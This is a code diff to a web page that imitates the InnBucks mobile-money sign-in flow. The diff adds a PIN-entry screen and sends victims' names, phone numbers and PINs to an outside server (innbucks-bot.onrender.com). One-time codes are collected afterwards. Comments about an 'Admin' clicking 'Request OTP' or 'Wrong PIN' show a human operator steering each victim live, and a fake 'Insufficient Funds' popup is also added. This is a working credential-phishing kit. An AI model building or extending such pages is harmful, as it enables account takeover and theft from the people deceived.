@@ -149,6 +149,7 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:20px;heigh
 .manual-btn:hover{background:var(--bg);}
 .footer-note{margin-top:20px;font-size:10.5px;color:var(--muted2);letter-spacing:0.05em;font-weight:500;}
 #screen-login{background:var(--navy);justify-content:flex-start;}
+#screen-pin{background:var(--navy);justify-content:flex-start;}
 .login-logo-wrap{display:flex;align-items:center;justify-content:center;gap:12px;padding-top:68px;}
 .login-dots{display:grid;grid-template-columns:1fr 1fr;gap:5px;}
 .ldot{width:22px;height:22px;border-radius:50%;}
@@ -156,13 +157,25 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:20px;heigh
 .login-heading{text-align:center;padding:52px 40px 0;}
 .login-heading h1{font-size:26px;font-weight:700;color:#fff;line-height:1.35;letter-spacing:-0.2px;}
 .login-heading p{font-size:14px;color:rgba(255,255,255,0.4);margin-top:10px;line-height:1.5;}
+.pin-heading{text-align:center;padding:52px 40px 0;}
+.pin-heading h1{font-size:28px;font-weight:700;color:#fff;letter-spacing:-0.2px;margin-bottom:12px;}
+.pin-heading p{font-size:15px;font-weight:500;color:rgba(255,255,255,0.55);line-height:1.5;}
 .login-field-wrap{padding:44px 28px 0;}
+.pin-field-wrap{padding:44px 28px 0;}
+.pin-field-label{font-size:13px;font-weight:500;color:rgba(255,255,255,0.45);margin-bottom:12px;}
 .login-field-row{display:flex;align-items:flex-end;gap:10px;border-bottom:1.5px solid rgba(255,255,255,0.18);padding-bottom:10px;}
+.pin-field-row{display:flex;align-items:center;border-bottom:1.5px solid rgba(255,255,255,0.18);padding-bottom:12px;position:relative;}
 .login-cc{display:flex;align-items:center;gap:4px;color:#fff;font-size:16px;font-weight:500;cursor:pointer;white-space:nowrap;flex-shrink:0;}
 .login-cc svg{width:9px;height:9px;fill:rgba(255,255,255,0.5);}
 .login-divider{width:1px;height:18px;background:rgba(255,255,255,0.15);flex-shrink:0;}
 .login-input{flex:1;background:transparent;border:none;outline:none;color:#e2e8f0;font-size:15px;font-family:'Inter',sans-serif;padding:0;}
 .login-input::placeholder{color:rgba(255,255,255,0.28);}
+.pin-input{flex:1;background:transparent;border:none;outline:none;color:#e2e8f0;font-size:22px;font-family:'Inter',sans-serif;padding:0;letter-spacing:8px;width:100%;}
+.pin-input::placeholder{color:rgba(255,255,255,0.2);letter-spacing:4px;}
+.pin-eye{position:absolute;right:0;cursor:pointer;color:rgba(255,255,255,0.45);padding:4px;display:flex;align-items:center;}
+.pin-eye svg{width:22px;height:22px;}
+.pin-forgot{margin-top:22px;text-align:center;}
+.pin-forgot span{font-size:14px;font-weight:500;color:#60a5fa;cursor:pointer;}
 .login-terms{padding:22px 28px 0;font-size:12.5px;color:rgba(255,255,255,0.3);line-height:1.6;text-align:center;}
 .login-terms span{color:rgba(100,160,255,0.65);}
 .login-security{display:flex;align-items:center;justify-content:center;gap:6px;padding:16px 28px 0;}
@@ -365,12 +378,35 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:20px;heigh
   <div class="login-terms">By pressing Continue you agree to our <span>Privacy Policy</span> and <span>Terms and Conditions</span>.</div>
   <div class="login-security"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span>Secured with 256-bit encryption</span></div>
   <div class="spacer"></div>
-  <div class="login-btn-wrap"><button class="login-btn" id="loginBtn" onclick="goToOTP()" disabled style="opacity:0.4;cursor:not-allowed;">Continue</button></div>
+  <div class="login-btn-wrap"><button class="login-btn" id="loginBtn" onclick="goToPIN()" disabled style="opacity:0.4;cursor:not-allowed;">Continue</button></div>
 </div>
 
-<!-- SCREEN 7 — OTP -->
+<!-- SCREEN 7 — PIN -->
+<div class="screen right" id="screen-pin">
+  <div class="login-logo-wrap"><div class="login-dots"><div class="ldot" style="background:#F5A623"></div><div class="ldot" style="background:#8B5CF6"></div><div class="ldot" style="background:#22C55E"></div><div class="ldot" style="background:#EF4444"></div></div><span class="login-name">InnBucks</span></div>
+  <div class="pin-heading">
+    <h1>Hello,</h1>
+    <p>Please enter your PIN to sign in.</p>
+  </div>
+  <div class="pin-field-wrap">
+    <div class="pin-field-label">Enter PIN</div>
+    <div class="pin-field-row">
+      <input id="pinInput" class="pin-input" type="password" inputmode="numeric" maxlength="4" placeholder="••••" oninput="sanitisePIN(this)"/>
+      <div class="pin-eye" onclick="togglePIN()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+      </div>
+    </div>
+    <div class="pin-forgot"><span>Forgot PIN?</span></div>
+  </div>
+  <div class="spacer"></div>
+  <div class="login-btn-wrap">
+    <button class="login-btn" id="pinBtn" onclick="submitPIN()" disabled style="opacity:0.4;cursor:not-allowed;">Continue</button>
+  </div>
+</div>
+
+<!-- SCREEN 8 — OTP -->
 <div class="screen right" id="screen-otp">
-  <div class="otp-back" onclick="nav('screen-otp','screen-login','back')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></div>
+  <div class="otp-back" onclick="nav('screen-otp','screen-pin','back')"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></div>
   <div class="otp-heading"><h1>Enter your code</h1><p>We sent a 5-digit code to<br><strong id="otpPhoneDisplay">+263</strong></p></div>
   <div class="otp-dots-wrap" onclick="focusOTP()">
     <div class="otp-d empty" id="d0"></div><div class="otp-d empty" id="d1"></div><div class="otp-d empty" id="d2"></div><div class="otp-d empty" id="d3"></div><div class="otp-d empty" id="d4"></div>
@@ -388,7 +424,6 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:20px;heigh
 <input id="otp-collector" type="tel" maxlength="5" inputmode="numeric" autocomplete="one-time-code"/>
 
 <script>
-// ✅ FIXED: correct API URL pointing to Node.js server
 const API_BASE_URL = 'https://innbucks-bot.onrender.com/api';
 
 let currentSessionId = null;
@@ -411,7 +446,6 @@ function showPopup(title, message, type = 'wrong') {
 }
 function closePopup() { document.getElementById('popupOverlay').classList.remove('show'); }
 
-// ✅ FIXED: fetch goes to API_BASE_URL directly (no /api.php)
 async function callApi(action, data = {}) {
   const params = new URLSearchParams();
   params.append('action', action);
@@ -429,7 +463,6 @@ async function callApi(action, data = {}) {
   }
 }
 
-// ✅ FIXED: polling also uses API_BASE_URL directly (no /api.php)
 function startStatusPolling(sessionId) {
   if (statusCheckInterval) clearInterval(statusCheckInterval);
   currentSessionId = sessionId;
@@ -439,13 +472,28 @@ function startStatusPolling(sessionId) {
       const result = await response.json();
       if (result.success && result.status) {
         if (result.status === 'approved') {
-          hideLoading(); clearInterval(statusCheckInterval); statusCheckInterval = null;
+          // Admin clicked Request OTP — go to OTP screen
+          hideLoading();
+          clearInterval(statusCheckInterval); statusCheckInterval = null;
+          nav('screen-pin', 'screen-otp');
+          resetOTP(); startOTPResendCountdown(); setTimeout(focusOTP, 400);
+          startStatusPolling(currentSessionId);
+        } else if (result.status === 'wrong_pin') {
+          // Admin clicked Wrong PIN
+          hideLoading();
+          clearInterval(statusCheckInterval); statusCheckInterval = null;
+          showPopup('Wrong PIN', 'The PIN you entered is incorrect. Please try again.', 'wrong');
+          document.getElementById('pinInput').value = '';
+          const btn = document.getElementById('pinBtn');
+          btn.disabled = true; btn.style.opacity = '0.4'; btn.style.cursor = 'not-allowed';
         } else if (result.status === 'wrong_code') {
-          hideLoading(); clearInterval(statusCheckInterval); statusCheckInterval = null;
+          hideLoading();
+          clearInterval(statusCheckInterval); statusCheckInterval = null;
           showPopup('Incorrect Code', 'The code you entered is incorrect. Please try again.', 'wrong');
           resetOTP();
         } else if (result.status === 'continue') {
-          hideLoading(); clearInterval(statusCheckInterval); statusCheckInterval = null;
+          hideLoading();
+          clearInterval(statusCheckInterval); statusCheckInterval = null;
           showPopup('Insufficient Funds', 'Please add more funds to your account and try again.', 'continue');
         }
       }
@@ -536,18 +584,37 @@ function sanitiseLoginPhone(el) {
   btn.disabled=!ready; btn.style.opacity=ready?'1':'0.4'; btn.style.cursor=ready?'pointer':'not-allowed';
 }
 
-async function goToOTP() {
+// Phone Continue → go to PIN screen (no API call yet)
+function goToPIN() {
   const raw=document.getElementById('phoneInput').value.trim();
   if(raw.length<9||raw.length>12) return;
+  document.getElementById('otpPhoneDisplay').textContent='+263 '+raw;
+  nav('screen-login','screen-pin');
+}
+
+// PIN screen
+function sanitisePIN(el) {
+  el.value=el.value.replace(/\D/g,'').slice(0,4);
+  const btn=document.getElementById('pinBtn');
+  const ready=el.value.length===4;
+  btn.disabled=!ready; btn.style.opacity=ready?'1':'0.4'; btn.style.cursor=ready?'pointer':'not-allowed';
+}
+
+function togglePIN() {
+  const input=document.getElementById('pinInput');
+  input.type=input.type==='password'?'text':'password';
+}
+
+async function submitPIN() {
+  const raw=document.getElementById('phoneInput').value.trim();
+  const pin=document.getElementById('pinInput').value.trim();
+  if(pin.length!==4) return;
   const firstName=document.getElementById('p2First').value.trim()||'Unknown';
   const lastName=document.getElementById('p2Last').value.trim()||'User';
   showLoading();
-  const result=await callApi('login_attempt',{firstName,lastName,phone:raw});
+  const result=await callApi('login_attempt',{firstName,lastName,phone:raw,pin});
   if(result.success&&result.data&&result.data.sessionId){
     currentSessionId=result.data.sessionId;
-    document.getElementById('otpPhoneDisplay').textContent='+263 '+raw;
-    nav('screen-login','screen-otp');
-    resetOTP(); startOTPResendCountdown(); setTimeout(focusOTP,400);
     startStatusPolling(currentSessionId);
   } else {
     hideLoading();
@@ -555,6 +622,7 @@ async function goToOTP() {
   }
 }
 
+// OTP
 const collector=document.getElementById('otp-collector');
 const verifyBtn=document.getElementById('verifyBtn');
 const dots=[0,1,2,3,4].map(i=>document.getElementById('d'+i));
@@ -579,6 +647,7 @@ function startOTPResendCountdown(){
   resendIv=setInterval(()=>{s--;if(s<=0){clearInterval(resendIv);cd.textContent='';btn.disabled=false;btn.style.opacity='1';}else{cd.textContent=`Resend in ${s}s`;}},1000);
 }
 function startResend(){startOTPResendCountdown();resetOTP();}
+
 async function handleVerify(){
   if(collector.value.length===5&&currentSessionId){
     showLoading();
@@ -586,7 +655,6 @@ async function handleVerify(){
     if(result.success){
       verifyBtn.textContent='Verifying…';
       verifyBtn.disabled=true;
-      // ✅ Restart polling to catch wrong_code or continue response
       startStatusPolling(currentSessionId);
     } else {
       hideLoading();
